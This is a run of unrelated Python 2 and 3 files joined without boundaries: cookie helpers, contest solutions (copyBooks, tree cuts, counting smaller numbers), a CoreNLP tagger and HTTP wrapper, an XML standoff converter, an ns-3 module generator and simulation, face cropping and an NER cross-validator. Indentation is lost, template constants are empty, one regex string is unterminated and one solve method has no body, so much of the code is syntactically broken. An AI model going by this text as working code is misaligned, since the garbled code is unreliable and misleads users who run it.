path_specified=bool(morsel['path']),
secure=bool(morsel['secure']),
expires=morsel['max-age'] or morsel['expires'],
discard=False,
comment=morsel['comment'],
comment_url=bool(morsel['comment']),
rest={'HttpOnly': morsel['httponly']},
rfc2109=False,)
return c
def cookiejar_from_dict(cookie_dict, cookiejar=None):
if cookiejar is None:
cookiejar = RequestsCookieJar()
if cookie_dict is not None:
for name in cookie_dict:
cookiejar.set_cookie(create_cookie(name, cookie_dict[name]))
return cookiejar
class Solution:
def copyBooks(self, pages, k):
n = len(pages)
s = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
s[i] = s[i-1] + pages[i-1]
F = [[s[j] for j in xrange(n+1)] for _ in xrange(k+1)]
for i in xrange(2, k+1):
l = 0
r = 1
while r < n+1:
F[i][r] = min(F[i][r],
max(F[i-1][l], s[r]-s[l])
)
if F[i-1][l] < s[r]-s[l] and l < r:
l += 1
else:
if l > 0: l -= 1
r += 1
return F[-1][-1]
class Solution_TLE:
def copyBooks(self, pages, k):
n = len(pages)
s = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
s[i] = s[i-1] + pages[i-1]
F = [[s[j] for j in xrange(n+1)] for _ in xrange(k+1)]
for i in xrange(2, k+1):
for j in xrange(1, n+1):
F[i][j] = min(
max(F[i-1][t], s[j]-s[t]) for t in xrange(j)
)
return F[-1][-1]
class Solution_search:
def copyBooks(self, pages, k):
return self.bisect(pages, k, sum(pages)/k, sum(pages))
def bisect(self, pages, k, lower, upper):
while lower < upper:
mid = (lower+upper)/2
if self.valid(pages, k, mid):
upper = mid
else:
lower = mid+1
return lower
def valid(self, pages, k, limit):
cnt = 0
k -= 1
for p in pages:
if p > limit: return False
cnt += p
if cnt > limit:
cnt = p
k -= 1
if k < 0: return False
return True
if __name__ == "__main__":
assert Solution().copyBooks([3, 2], 5) == 3
import copy_reg
class State(object):
def __init__(self, level=0, lives=4, points=0):
self.level = level
self.lives = lives
self.points = points
def pickle_state(instance):
kwargs = instance.__dict__
return unpickle_state, (kwargs,)
def unpickle_state(kwargs):
return State(**kwargs)
copy_reg.pickle(State, pickle_state)
import functools
import inspect
from typing import get_type_hints, Callable, Iterable
from collections import MutableMapping, defaultdict
OVERLOAD = "__overload__"
def get_key(itr: Iterable) -> tuple:
return tuple(itr)
def dispatch(self, key, *args, **kwargs) -> Callable:
key_new = get_key(map(type, args))
try:
method = self.__class__.__overload__[key][key_new]
except KeyError:
raise AttributeError("{} has no overloaded method '{} with args {}'".format(self, key, key_new))
return method(self, *args, **kwargs)
class OverloadDict(MutableMapping):
def __init__(self, *args, **kwargs):
self._d = dict(*args, **kwargs)
self._d[OVERLOAD] = defaultdict(dict)
def __getitem__(self, key):
return self._d[key]
def _overload(self, key, method):
typehints = get_type_hints(method)
arg_types = (
v for k, v in typehints.items()
if k != "return"
)
key_new = get_key(arg_types)
self._d[OVERLOAD][key][key_new] = method
def __setitem__(self, key, value):
if key in self._d and inspect.isfunction(value):
method = value
if key not in self._d[OVERLOAD]:
self._overload(key, self._d[key])
self._d[key] = functools.partialmethod(dispatch, key)
self._overload(key, method)
else:
self._d[key] = value
def __delitem__(self, key):
del self._d[key]
def __iter__(self):
return iter(self._d)
def __len__(self):
return len(self._d)
def __contains__(self, key):
return key in self._d
def __repr__(self):
return "{}:{}".format(type(self).__name__, self._d)
class  OverloadMeta(type):
def __prepare__(cls, *args, **kwargs):
return OverloadDict()
def __new__(cls, name, bases, overload_dict: OverloadDict):
return super().__new__(cls, name, bases, dict(overload_dict))
from os import listdir
from os.path import isdir, join as path_join
from re import compile as re_compile, match
from pexpect import spawn
SENTENCE_OUTPUT_REGEX = re_compile(r'Sentence
OUTPUT_TOKEN_REGEX = re_compile(
r' CharacterOffsetBegin=(?P<start>[0-9]+).*'
r' CharacterOffsetEnd=(?P<end>[0-9]+).*'
r' NamedEntityTag=(?P<type>[^ \]]+)'
)
class CoreNLPTagger(object):
def __init__(self, core_nlp_path, mem='1024m'):
assert isdir(core_nlp_path)
jar_paths = []
for jar_regex in (
'^stanford-corenlp-[0-9]{4}-[0-9]{2}-[0-9]{2}\.jar$',
'^stanford-corenlp-[0-9]{4}-[0-9]{2}-[0-9]{2}-models\.jar$',
'^joda-time\.jar$',
'^xom\.jar$',
):
for fname in listdir(core_nlp_path):
if match(jar_regex, fname):
jar_paths.append(path_join(core_nlp_path, fname))
break
else:
assert False, 'could not locate any jar on the form "%s"' % jar_regex
corenlp_cmd = ' '.join(('java -Xmx%s' % mem,
'-cp %s' % ':'.join(jar_paths),
'edu.stanford.nlp.pipeline.StanfordCoreNLP',
'-annotators tokenize,ssplit,pos,lemma,ner',
))
self._core_nlp_process = spawn(corenlp_cmd, timeout=600)
self._core_nlp_process.expect('Entering interactive shell.')
def __del__(self):
if self._core_nlp_process.isalive():
self._core_nlp_process.terminate()
def tag(self, text):
self._core_nlp_process.sendline(
text.replace('\n', ' ')
)
output_timeout = 1 + int(len(text.split()) * 0.5)
self._core_nlp_process.expect(SENTENCE_OUTPUT_REGEX,
timeout=output_timeout)
self._core_nlp_process.expect('NLP>', timeout=output_timeout)
annotations = {}
def _add_ann(start, end, _type):
annotations[len(annotations)] = {
'type': _type,
'offsets': ((start, end), ),
'texts': ((text[start:end]), ),
}
for sent_output in (d.strip() for i, d in enumerate(
self._core_nlp_process.before.rstrip().split('\r\n'))
if (i + 1) % 3 == 0):
ann_start = None
last_end = None
ann_type = None
for output_token in sent_output.split('] ['):
m = OUTPUT_TOKEN_REGEX.search(output_token)
assert m is not None, 'failed to parse output'
gdic = m.groupdict()
start = int(gdic['start'])
end = int(gdic['end'])
_type = gdic['type']
if ((_type == 'O' or ann_type != _type)
and ann_start is not None):
_add_ann(ann_start, last_end, ann_type)
ann_start = None
ann_type = None
elif _type != 'O' and ann_start is None:
ann_start = start
ann_type = _type
last_end = end
if ann_start is not None:
_add_ann(ann_start, last_end, ann_type)
return annotations
if __name__ == '__main__':
tagger = CoreNLPTagger('stanford-corenlp-2012-04-09')
print tagger.tag('Just a test, like the ones they do at IBM.\n'
'Or Microsoft for that matter.')
from argparse import ArgumentParser
from cgi import FieldStorage
from os.path import dirname, join as path_join
from corenlp import CoreNLPTagger
try:
from json import dumps
except ImportError:
from sys import path as sys_path
sys_path.append(path_join(dirname(__file__), '../../server/lib/ujson'))
from ujson import dumps
from sys import stderr
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
ARGPARSER = ArgumentParser(description='XXX')
ARGPARSER.add_argument('-p', '--port', type=int, default=47111,
help='port to run the HTTP service on (default: 47111)')
TAGGER = None
CORENLP_PATH = path_join(dirname(__file__), 'stanford-corenlp-2012-04-09')
class CoreNLPTaggerHandler(BaseHTTPRequestHandler):
def do_POST(self):
print >> stderr, 'Received request'
field_storage = FieldStorage(
headers=self.headers,
environ={
'REQUEST_METHOD':'POST',
'CONTENT_TYPE':self.headers['Content-Type'],
},
fp=self.rfile)
global TAGGER
json_dic = TAGGER.tag(field_storage.value)
self.send_response(200)
self.send_header('Content-type', 'application/json; charset=utf-8')
self.end_headers()
self.wfile.write(dumps(json_dic))
print >> stderr, ('Generated %d annotations' % len(json_dic))
def log_message(self, format, *args):
return
def main(args):
argp = ARGPARSER.parse_args(args[1:])
print >> stderr, "WARNING: Don't use this in a production environment!"
print >> stderr, 'Starting CoreNLP process (this takes a while)...',
global TAGGER
TAGGER = CoreNLPTagger(CORENLP_PATH)
print >> stderr, 'Done!'
server_class = HTTPServer
httpd = server_class(('localhost', argp.port), CoreNLPTaggerHandler)
print >> stderr, 'CoreNLP tagger service started'
try:
httpd.serve_forever()
except KeyboardInterrupt:
pass
httpd.server_close()
print >> stderr, 'CoreNLP tagger service stopped'
if __name__ == '__main__':
from sys import argv
exit(main(argv))
import sys
import re
try:
import cElementTree as ET
except:
import xml.etree.cElementTree as ET
EXCLUDED_TAGS = [
]
EXCLUDED_TAG = { t:True for t in EXCLUDED_TAGS }
ELIDED_TEXT_STRING = "[[[...]]]"
MAXIMUM_TEXT_DISPLAY_LENGTH = 1000
def c_escape(s):
return s.replace('\\', '\\\\').replace('\t','\\t').replace('\n','\\n')
def strip_ns(tag):
return tag if tag[0] != '{' else re.sub(r'\{.*?\}', '', tag)
class Standoff:
def __init__(self, sid, element, start, end, text):
self.sid     = sid
self.element = element
self.start   = start
self.end     = end
self.text    = text
def compress_text(self, l):
if len(self.text) >= l:
el = len(ELIDED_TEXT_STRING)
sl = (l-el)/2
self.text = (self.text[:sl]+ELIDED_TEXT_STRING+self.text[-(l-sl-el):])
def tag(self):
return strip_ns(self.element.tag)
def attrib(self):
attrib = {}
for a in self.element.attrib:
if a[0] == "{":
an = re.sub(r'\{.*?\}', '', a)
else:
an = a
attrib[an] = self.element.attrib[a]
return attrib
def __str__(self):
return "X%d\t%s %d %d\t%s\t%s" % \
(self.sid, self.tag(), self.start, self.end,
c_escape(self.text.encode("utf-8")),
" ".join(['%s="%s"' % (k.encode("utf-8"), v.encode("utf-8"))
for k,v in self.attrib().items()]))
def txt(s):
return s if s is not None else ""
next_free_so_id = 1
def text_and_standoffs(e, curroff=0, standoffs=None):
global next_free_so_id
if standoffs == None:
standoffs = []
startoff = curroff
so = Standoff(next_free_so_id, e, 0, 0, "")
next_free_so_id += 1
standoffs.append(so)
setext, dummy = subelem_text_and_standoffs(e, curroff+len(txt(e.text)), standoffs)
text = txt(e.text) + setext
curroff += len(text)
so.start = startoff
so.end   = curroff
so.text  = text
return (text, standoffs)
def subelem_text_and_standoffs(e, curroff, standoffs):
startoff = curroff
text = ""
for s in e:
stext, dummy = text_and_standoffs(s, curroff, standoffs)
text += stext
text += txt(s.tail)
curroff = startoff + len(text)
return (text, standoffs)
def empty_elements(e, tags=None):
if tags is None or strip_ns(e.tag) in tags:
e.clear()
for c in e:
empty_elements(c, tags)
def add_space(e):
if strip_ns(e.tag) in ('title', ):
e.tail = (e.tail if e.tail is not None else '') + '\n'
for c in e:
add_space(c)
def convert_coresc1(s):
sostrings = []
tid = "T%d" % convert_coresc1._idseq
sostrings.append('%s\t%s %d %d\t%s' % \
(tid, s.attrib()['type'], s.start, s.end,
s.text.encode('utf-8')))
convert_coresc1._idseq += 1
return sostrings
convert_coresc1._idseq = 1
convert_function = {
'CoreSc1' : convert_coresc1,
'annotationART' : convert_coresc1,
}
def main(argv=[]):
if len(argv) != 4:
print >> sys.stderr, "Usage:", argv[0], "IN-XML OUT-TEXT OUT-SO"
return -1
in_fn, out_txt_fn, out_so_fn = argv[1:]
if in_fn == "-":
in_fn = "/dev/stdin"
if out_txt_fn == "-":
out_txt_fn = "/dev/stdout"
if out_so_fn == "-":
out_so_fn = "/dev/stdout"
tree = ET.parse(in_fn)
root = tree.getroot()
empty_elements(root, set(['article-categories',
'copyright-statement', 'license',
'copyright-holder', 'copyright-year',
'journal-meta', 'article-id',
'back',
'fig', 'table-wrap',
'contrib-group',
'aff', 'author-notes',
'pub-date',
'volume', 'issue',
'fpage', 'lpage',
'history'
]))
add_space(root)
text, standoffs = text_and_standoffs(root)
standoffs = [s for s in standoffs if not s.tag() in EXCLUDED_TAG]
converted = []
for s in standoffs:
if s.tag() in convert_function:
converted.extend(convert_function[s.tag()](s))
standoffs = converted
for so in standoffs:
try:
so.compress_text(MAXIMUM_TEXT_DISPLAY_LENGTH)
except AttributeError:
pass
out_txt = open(out_txt_fn, "wt")
out_so  = open(out_so_fn, "wt")
out_txt.write(text.encode("utf-8"))
for so in standoffs:
print >> out_so, so
out_txt.close()
out_so.close()
if __name__ == "__main__":
sys.exit(main(sys.argv))
MOD = 1005060097
class Solution(object):
def solve(self, cipher):
N, K = cipher
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (solution.solve(cipher))
print s,
import logging
import sys
class Solution(object):
@property
def logger(self):
lgr = logging.getLogger(__name__)
lgr.setLevel(logging.CRITICAL)
if not lgr.handlers:
ch = logging.StreamHandler(sys.stdout)
ch.setLevel(logging.DEBUG)
ch.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
lgr.addHandler(ch)
return lgr
def solve(self, cipher):
dirs = ((1, 0), (-1, 0), (0, 1), (0, -1))
M, N, matrix, K = cipher
start = None
end = None
for i in xrange(M):
for j in xrange(N):
if matrix[i][j] == "M":
start = (i, j)
elif matrix[i][j] == "*":
end = (i, j)
pi = [[None for _ in xrange(N)] for _ in xrange(M)]
visited = [[False for _ in xrange(N)] for _ in xrange(M)]
visited[start[0]][start[1]] = True
q = [start]
ended = False
while q and not ended:
l = len(q)
for i in xrange(l):
cur = q[i]
for dir in dirs:
r = cur[0] + dir[0]
c = cur[1] + dir[1]
if 0 <= r < M and 0 <= c < N and not visited[r][c]:
visited[r][c] = True
if matrix[r][c] in (".", "*"):
pi[r][c] = cur
q.append((r, c))
if matrix[r][c] == "*":
ended = True
q = q[l:]
if not ended:
return "not found"
path = [end]
cur = end
while cur != start:
cur = pi[cur[0]][cur[1]]
path.append(cur)
path.reverse()
self.logger.debug(str(path))
cnt = 0
visited = [[False for _ in xrange(N)] for _ in xrange(M)]
for cur in path[:-1]:
dir_cnt = 0
visited[cur[0]][cur[1]] = True
for dir in dirs:
r = cur[0] + dir[0]
c = cur[1] + dir[1]
if 0 <= r < M and 0 <= c < N:
if matrix[r][c] in (".", "*") and not visited[r][c]:
dir_cnt += 1
if dir_cnt > 1:
cnt += 1
self.logger.debug("Wand@" + str(cur))
if cnt > K:
return "Oops!"
self.logger.debug("cnt: %d, K: %d" % (cnt, K))
if cnt == K:
return "Impressed"
else:
return "Oops!"
if __name__ == "__main__":
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
M, N = map(int, f.readline().strip().split(' '))
matrix = []
for _ in xrange(M):
matrix.append(list(f.readline().strip()))
K = int(f.readline().strip())
cipher = M, N, matrix, K
s = "%s\n" % (Solution().solve(cipher))
print s,
class Node(object):
def __init__(self, val):
self.val = val
self.cnt_left = 0
self.cnt_this = 0
self.left, self.right = None, None
def __repr__(self):
return repr(self.val)
class BST(object):
def __init__(self):
self.root = None
def insert(self, root, val):
if not root:
root = Node(val)
if root.val == val:
root.cnt_this += 1
elif val < root.val:
root.cnt_left += 1
root.left = self.insert(root.left, val)
else:
root.right = self.insert(root.right, val)
return root
def rank(self, root, val):
if not root:
return 0
if root.val < val:
return root.cnt_this+root.cnt_left+self.rank(root.right, val)
elif root.val == val:
return root.cnt_left
else:
return self.rank(root.left, val)
class Solution(object):
def countOfSmallerNumberII(self, A):
tree = BST()
ret = []
for a in A:
tree.root = tree.insert(tree.root, a)
ret.append(tree.rank(tree.root, a))
return ret
if __name__ == "__main__":
assert Solution().countOfSmallerNumberII(
[26, 78, 27, 100, 33, 67, 90, 23, 66, 5, 38, 7, 35, 23, 52, 22, 83, 51, 98, 69, 81, 32, 78, 28, 94, 13, 2, 97,
3, 76, 99, 51, 9, 21, 84, 66, 65, 36, 100, 41]) == [0, 1, 1, 3, 2, 3, 5, 0, 4, 0, 5, 1, 6, 2, 9, 2, 14, 10, 17,
14, 16, 7, 16, 7, 22, 2, 0, 25, 1, 20, 29, 15, 4, 6, 28,
20, 20, 16, 37, 18]
class Solution:
def countOfSmallerNumber(self, A, queries):
return self.search(A, queries)
def loop(self, A, queries):
cnt = dict(zip(queries, [0 for _ in queries]))
for elt in A:
for k in cnt.keys():
if elt<k:
cnt[k] += 1
return [cnt[i] for i in queries]
def search(self, A, queries):
A.sort()
ret = []
for q in queries:
ind = self.bin_search(A, q)
while ind>=0 and A[ind]==q:
ind -= 1
ret.append(ind+1)
return ret
def bin_search(self, A, t):
b = 0
e = len(A)
while b<e:
m = (b+e)/2
if t==A[m]:
return m
elif t < A[m]:
e = m
else:
b = m+1
return b-1
def segment_tree(self, A, queries):
pass
class Solution(object):
def solve(self, cipher):
N = cipher
turn = 0
while N > 1:
turn += 1
if N & (N - 1) == 0:
N /= 2
else:
num = 1
while num < N:
num <<= 1
num >>= 1
N -= num
if turn & 1 == 0:
return "Richard"
else:
return "Louise"
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = int(f.readline().strip())
s = "%s\n" % (Solution().solve(cipher))
print s,
import sys
from optparse import OptionParser
import os
WSCRIPT_TEMPLATE =
MODEL_CC_TEMPLATE =
MODEL_H_TEMPLATE =
HELPER_CC_TEMPLATE =
HELPER_H_TEMPLATE =
EXAMPLES_WSCRIPT_TEMPLATE =
EXAMPLE_CC_TEMPLATE =
TEST_CC_TEMPLATE =
def main(argv):
parser = OptionParser(usage=("Usage: %prog [options] modulename\n"
"Utility script to create a basic template for a new ns-3 module"))
(options, args) = parser.parse_args()
if len(args) != 1:
parser.print_help()
return 1
modname = args[0]
assert os.path.sep not in modname
moduledir = os.path.join(os.path.dirname(__file__), modname)
if os.path.exists(moduledir):
print >> sys.stderr, "Module %r already exists" % (modname,)
return 2
os.mkdir(moduledir)
wscript = file(os.path.join(moduledir, "wscript"), "wt")
wscript.write(WSCRIPT_TEMPLATE % dict(MODULE=modname))
wscript.close()
modeldir = os.path.join(moduledir, "model")
os.mkdir(modeldir)
model_cc = file(os.path.join(moduledir, "model", "%s.cc" % modname), "wt")
model_cc.write(MODEL_CC_TEMPLATE % dict(MODULE=modname))
model_cc.close()
model_h = file(os.path.join(moduledir, "model", "%s.h" % modname), "wt")
model_h.write(MODEL_H_TEMPLATE % dict(MODULE=modname, INCLUDE_GUARD="__%s_H__" % (modname.upper()),))
model_h.close()
testdir = os.path.join(moduledir, "test")
os.mkdir(testdir)
test_cc = file(os.path.join(moduledir, "test", "%s-test-suite.cc" % modname), "wt")
test_cc.write(TEST_CC_TEMPLATE % dict(MODULE=modname,CAPITALIZED=modname.capitalize()))
test_cc.close()
helperdir = os.path.join(moduledir, "helper")
os.mkdir(helperdir)
helper_cc = file(os.path.join(moduledir, "helper", "%s-helper.cc" % modname), "wt")
helper_cc.write(HELPER_CC_TEMPLATE % dict(MODULE=modname))
helper_cc.close()
helper_h = file(os.path.join(moduledir, "helper", "%s-helper.h" % modname), "wt")
helper_h.write(HELPER_H_TEMPLATE % dict(MODULE=modname, INCLUDE_GUARD="__%s_HELPER_H__" % (modname.upper()),))
helper_h.close()
examplesdir = os.path.join(moduledir, "examples")
os.mkdir(examplesdir)
examples_wscript = file(os.path.join(examplesdir, "wscript"), "wt")
examples_wscript.write(EXAMPLES_WSCRIPT_TEMPLATE % dict(MODULE=modname))
examples_wscript.close()
example_cc = file(os.path.join(moduledir, "examples", "%s-example.cc" % modname), "wt")
example_cc.write(EXAMPLE_CC_TEMPLATE % dict(MODULE=modname))
example_cc.close()
return 0
if __name__ == '__main__':
sys.exit(main(sys.argv))
import sys, math, Image
def Distance(p1,p2):
dx = p2[0] - p1[0]
dy = p2[1] - p1[1]
return math.sqrt(dx*dx+dy*dy)
def ScaleRotateTranslate(image, angle, center = None, new_center = None, scale = None, resample=Image.BICUBIC):
if (scale is None) and (center is None):
return image.rotate(angle=angle, resample=resample)
nx,ny = x,y = center
sx=sy=1.0
if new_center:
(nx,ny) = new_center
if scale:
(sx,sy) = (scale, scale)
cosine = math.cos(angle)
sine = math.sin(angle)
a = cosine/sx
b = sine/sx
c = x-nx*a-ny*b
d = -sine/sy
e = cosine/sy
f = y-nx*d-ny*e
return image.transform(image.size, Image.AFFINE, (a,b,c,d,e,f), resample=resample)
def CropFace(image, eye_left=(0,0), eye_right=(0,0), offset_pct=(0.2,0.2), dest_sz = (70,70)):
offset_h = math.floor(float(offset_pct[0])*dest_sz[0])
offset_v = math.floor(float(offset_pct[1])*dest_sz[1])
eye_direction = (eye_right[0] - eye_left[0], eye_right[1] - eye_left[1])
rotation = -math.atan(float(eye_direction[1])/float(eye_direction[0]))
dist = Distance(eye_left, eye_right)
reference = dest_sz[0] - 2.0*offset_h
scale = float(dist)/float(reference)
image = ScaleRotateTranslate(image, center=eye_left, angle=rotation)
crop_xy = (eye_left[0] - scale*offset_h, eye_left[1] - scale*offset_v)
crop_size = (dest_sz[0]*scale, dest_sz[1]*scale)
image = image.crop((int(crop_xy[0]), int(crop_xy[1]), int(crop_xy[0]+crop_size[0]), int(crop_xy[1]+crop_size[1])))
image = image.resize(dest_sz, Image.ANTIALIAS)
return image
if __name__ == "__main__":
image =  Image.open("arnie.jpg")
CropFace(image, eye_left=(280,322), eye_right=(435,395), offset_pct=(0.3,0.3), dest_sz=(200,200)).save("arnie_10_10_200_200.jpg")
import os
import io
import re
class CrossValidator(object):
def __init__(self):
self.directory = os.path.dirname(os.path.realpath(__file__))
self.file_names = self.read_file_names_from_dir(os.path.join(self.directory, "data"))
def cross_validate(self, k=4):
file_names = self.group_files(False, k)
for fold in range(k):
print "fold=%d"%(fold+1)
train = []
for files in file_names[0:fold]+file_names[fold+1:]:
for file in files:
train.append(file)
test = []
for files in file_names[fold:fold+1]:
for file in files:
test.append(file)
print "training ",
print train
print "testing ",
print test
self.combine_files(train, os.path.join(self.directory, "train.tsv"))
self.combine_files(test, os.path.join(self.directory, "test.tsv"))
os.system("java -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier \
-prop recipe.prop > fold-%d.log 2>&1"%fold)
self.tag_files(test, 'non-auto')
self.tag_files(test, 'auto')
def tag_files(self, raw_tsv, input_folder_name):
for f_input in raw_tsv:
f_input = re.sub(r'\.tsv', '.txt', f_input)
f_input = re.sub(r'data', input_folder_name, f_input)
f_tagged = re.sub(r'\.txt', '-tagged.xml', f_input)
os.system("java -mx500m -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier\
-loadClassifier ner-model.ser.gz -textFile %s -outputFormat inlineXML > %s"%(f_input, f_tagged))
def group_files(self, default=True, k=4):
file_names = [[] for _ in xrange(k)]
if default:
part = len(self.file_names)/k
for i in xrange(k):
file_names[i] = self.file_names[i*part:(i+1)*part]
return file_names
else:
starts = [1, 7, 15, 24, 34]
for i in xrange(len(starts)-1):
file_names[i] = ["data/%d.tsv"%(j) for j in xrange(starts[i], starts[i+1])]
return file_names
def read_file_names_from_dir(self, path):
names = []
print path
for root, dirs, files in os.walk(path):
for file in files:
if file.endswith(".tsv"):
names.append(os.path.join(root, file))
return names
def combine_files(self, files, output_path):
output = []
for file in files:
with io.open(file, 'r', newline='', encoding="utf-8") as f:
output.append(f.read())
f.close()
with io.open(output_path, 'w', newline='', encoding="utf-8") as o:
o.write("\n".join(output))
o.close()
def do(self):
self.cross_validate()
if __name__=="__main__":
v = CrossValidator()
v.do()
import ns.applications
import ns.bridge
import ns.core
import ns.csma
import ns.internet
import ns.network
def main(argv):
cmd = ns.core.CommandLine()
cmd.Parse(argv)
terminals = ns.network.NodeContainer()
terminals.Create(4)
csmaSwitch = ns.network.NodeContainer()
csmaSwitch.Create(1)
csma = ns.csma.CsmaHelper()
csma.SetChannelAttribute("DataRate", ns.network.DataRateValue(ns.network.DataRate(5000000)))
csma.SetChannelAttribute("Delay", ns.core.TimeValue(ns.core.MilliSeconds(2)))
terminalDevices = ns.network.NetDeviceContainer()
switchDevices = ns.network.NetDeviceContainer()
for i in range(4):
link = csma.Install(ns.network.NodeContainer(ns.network.NodeContainer(terminals.Get(i)), csmaSwitch))
terminalDevices.Add(link.Get(0))
switchDevices.Add(link.Get(1))
switchNode = csmaSwitch.Get(0)
bridgeDevice = ns.bridge.BridgeNetDevice()
switchNode.AddDevice(bridgeDevice)
for portIter in range(switchDevices.GetN()):
bridgeDevice.AddBridgePort(switchDevices.Get(portIter))
internet = ns.internet.InternetStackHelper()
internet.Install(terminals)
ipv4 = ns.internet.Ipv4AddressHelper()
ipv4.SetBase(ns.network.Ipv4Address("10.1.1.0"), ns.network.Ipv4Mask("255.255.255.0"))
ipv4.Assign(terminalDevices)
port = 9
onoff = ns.applications.OnOffHelper("ns3::UdpSocketFactory",
ns.network.Address(ns.network.InetSocketAddress(ns.network.Ipv4Address("10.1.1.2"), port)))
onoff.SetAttribute("OnTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(1)))
onoff.SetAttribute("OffTime", ns.core.RandomVariableValue(ns.core.ConstantVariable(0)))
app = onoff.Install(ns.network.NodeContainer(terminals.Get(0)))
app.Start(ns.core.Seconds(1.0))
app.Stop(ns.core.Seconds(10.0))
sink = ns.applications.PacketSinkHelper("ns3::UdpSocketFactory",
ns.network.Address(ns.network.InetSocketAddress(ns.network.Ipv4Address.GetAny(), port)))
app = sink.Install(ns.network.NodeContainer(terminals.Get(1)))
app.Start(ns.core.Seconds(0.0))
onoff.SetAttribute("Remote",
ns.network.AddressValue(ns.network.InetSocketAddress(ns.network.Ipv4Address("10.1.1.1"), port)))
app = onoff.Install(ns.network.NodeContainer(terminals.Get(3)))
app.Start(ns.core.Seconds(1.1))
app.Stop(ns.core.Seconds(10.0))
app = sink.Install(ns.network.NodeContainer(terminals.Get(0)))
app.Start(ns.core.Seconds(0.0))
csma.EnablePcapAll("csma-bridge", False)
ns.core.Simulator.Run()
ns.core.Simulator.Destroy()
if __name__ == '__main__':
import sys
main(sys.argv)
class Solution(object):
def solve(self, cipher):
N, A = cipher
A.sort()
result = []
while A:
result.append(len(A))
A = map(lambda x: x - A[0], A)
A = filter(lambda x: x > 0, A)
return "\n".join(map(str, result))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
N = int(f.readline().strip())
A = map(int, f.readline().strip().split(' '))
cipher = N, A
s = "%s\n" % (solution.solve(cipher))
print s,
class TreeNode(object):
def __init__(self, item):
self.item = item
self.tree_sum = None
self.left = None
self.right = None
def __repr__(self):
return repr(self.item)
class Solution_error(object):
def solve(self, cipher):
root = self.construct_tree(cipher)
total = self.get_tree_sum(root)
mini = [1 << 32]
self.dfs(root, total, mini)
return mini[0]
def dfs(self, root, total, mini):
if not root:
return
mini[0] = min(mini[0], abs(total - root.tree_sum - root.tree_sum))
self.dfs(root.left, total, mini)
self.dfs(root.right, total, mini)
def construct_tree(self, cipher):
N, nodes, rls = cipher
lst = [TreeNode(val) for val in nodes]
rls = map(lambda x: [x[0] - 1, x[1] - 1], rls)
linked_set = {0}
for r in rls:
if r[0] in linked_set:
parent = r[0]
child = r[1]
else:
parent = r[1]
child = r[0]
linked_set.add(child)
if not lst[parent].left:
lst[parent].left = lst[child]
else:
lst[parent].right = lst[child]
return lst[0]
def get_tree_sum(self, root):
if not root.tree_sum:
left_sum = self.get_tree_sum(root.left) if root.left else 0
right_sum = self.get_tree_sum(root.right) if root.right else 0
root.tree_sum = left_sum + right_sum + root.item
return root.tree_sum
class Solution(object):
def __init__(self):
self.order = 0
def __inc_order(self):
self.order += 1
return self.order
def solve(self, cipher):
N, data, rls = cipher
visited = [-1 for _ in xrange(N)]
E = [(0, 0) for _ in xrange(N - 1)]
G = [[] for _ in xrange(N)]
v_sum = [-1 for _ in xrange(N)]
_sum = sum(data)
for ind, r in enumerate(rls):
u = r[0] - 1
v = r[1] - 1
G[u].append(v)
G[v].append(u)
E[ind] = (u, v)
def get_sum(s):
if v_sum[s] == -1:
visited[s] = self.__inc_order()
v_sum[s] = data[s]
for n in G[s]:
if visited[n] == -1:
v_sum[s] += get_sum(n)
return v_sum[s]
get_sum(0)
mini = 1 << 32
for e in E:
u, v = e
if visited[u] > visited[v]:
mini = min(mini, abs(_sum - get_sum(u) - get_sum(u)))
else:
mini = min(mini, abs(_sum - get_sum(v) - get_sum(v)))
return mini
if __name__ == "__main__":
import sys
sys.setrecursionlimit(100000)
f = open("1.in", "r")
N = int(f.readline().strip())
nodes = map(int, f.readline().strip().split(' '))
rls = []
for t in xrange(N - 1):
rls.append(map(int, f.readline().strip().split(' ')))
cipher = N, nodes, rls
s = "%s\n" % (Solution().solve(cipher))
print s,
MOD = 10 ** 9 + 7
class Cost(object):
def __init__(self):
self.cost = 0
def __iadd__(self, other):
self.cost = (self.cost + other % MOD) % MOD
return self
class Solution(object):
def solve(self, cipher):
M, N, Y, X = cipher
y = list(Y)
x = list(X)
y.sort()
x.sort()
cost = Cost()
while x and y:
x_max = x[-1]
y_max = y[-1]
if x_max > y_max:
cost += x.pop() * (M - len(y))
elif y_max > x_max:
cost += y.pop() * (N - len(x))
else:
if sum(x) > sum(y):
cost += x.pop() * (M - len(y))
else:
cost += y.pop() * (N - len(x))
while x:
cost += x.pop() * (M - len(y))
while y:
cost += y.pop() * (N - len(x))
return cost.cost
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
M, N = map(int, f.readline().strip().split(" "))
Y = map(int, f.readline().strip().split(" "))
X = map(int, f.readline().strip().split(" "))
cipher = [M, N, Y, X]
s = "%s\n" % (Solution().solve(cipher))
print s,
MOD = 10 ** 9 + 7
class Solution_error(object):
def solve(self, cipher):
L = [cipher[2 * i] for i in xrange(4)]
R = [cipher[2 * i + 1] for i in xrange(4)]
result = 1
for i in xrange(4):
result = (result * (R[i] - L[i] + 1)) % MOD
pairs = [(0, 1), (0, 2), (0, 3), (1, 2), (1, 3), (2, 3)]
for pair in pairs:
other = max(0, min(R[i] for i in pair) - max(L[i] for i in pair) + 1)
for i in xrange(4):
if i not in pair:
other = (other * (R[i] - L[i] + 1)) % MOD
result = (result - other) % MOD
pairs = [(0, 1, 2), (0, 1, 3), (0, 2, 3), (1, 2, 3)]
for pair in pairs:
other = max(0, min(R[i] for i in pair) - max(L[i] for i in pair) + 1)
for i in xrange(4):
if i not in pair:
other = (other * (R[i] - L[i] + 1)) % MOD
result = (result + other) % MOD
result = (result - max(0, min(R) - max(L) + 1)) % MOD
return result
class Interval(object):
def __init__(self, l, r):
self.l = l
self.r = r
